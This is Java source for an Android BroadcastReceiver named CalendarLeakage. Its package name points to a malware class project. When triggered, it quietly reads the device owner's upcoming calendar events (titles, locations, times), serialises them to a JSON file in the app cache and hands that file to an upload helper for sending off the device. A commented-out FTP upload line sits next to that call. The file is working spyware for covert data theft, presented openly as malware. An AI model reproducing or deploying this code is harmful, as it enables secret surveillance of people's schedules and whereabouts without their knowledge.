package com.malwareclass.malwareproject;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CalendarContract;
import android.support.v4.app.ActivityCompat;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.Writer;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.TimeZone;

public class CalendarLeakage extends BroadcastReceiver {

    private String TAG = "CalendarLeakage";
    @Override
    public void onReceive(Context context, Intent intent) {

        Log.d(TAG,"Started") ;
        Cursor cur = null;
        ContentResolver cr = context.getContentResolver();
        Uri uri = CalendarContract.Events.CONTENT_URI;
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALENDAR) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }

        String selection = "dtstart >= ?";
        String[] selectionArgs = new String[] {String.valueOf(System.currentTimeMillis())};
        cur = cr.query(uri, null, selection, selectionArgs, null);
        JSONArray arr = new JSONArray();
        while (cur.moveToNext()) {
            String toJson = "";
            String title = cur.getString(cur.getColumnIndex(CalendarContract.Events.TITLE));
            String location = cur.getString(cur.getColumnIndex(CalendarContract.Events.EVENT_LOCATION));
            Long start = cur.getLong(cur.getColumnIndex(CalendarContract.Events.DTSTART));
            Long end_l = cur.getLong(cur.getColumnIndex(CalendarContract.Events.DTEND));
            SimpleDateFormat df = new SimpleDateFormat("hh:mm dd/MM/yyyy");
            df.setTimeZone(TimeZone.getTimeZone("GMT"));
            String s = df.format(start);
            String end = df.format(end_l);
            //Log.i(TAG, title + "-" + location + "-" + s + "-" + e);

            toJson += "{ \"title\":\"" + title + "\", \"location\":\"" + location + "\", \"start\":\"" + s + "\", \"end\":\""+end+"\"}";
            //Log.i(TAG,toJson);
            JSONObject jsonOb = null;
            try {
                jsonOb = new JSONObject(toJson);
            } catch (JSONException e) {
                e.printStackTrace();
            }
            arr.put(jsonOb);
        }
        cur.close();


        Writer output = null;
        String pathname = "calendar_" + new SimpleDateFormat("yyyy.MM.dd-HH.mm.ss").format(new Date()) + ".json";
        File file = new File(context.getCacheDir(),pathname);
        try {
            output = new BufferedWriter(new FileWriter(file));
            output.write(arr.toString());
            output.close();
            File[] files = new File[1];
            files[0] = file;
            //new FTP(context).upload(files, "calendar");
            if(UploadData.getIstance(context).addFile("calendar", files))
                Log.d(TAG, "Calendar data added!");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
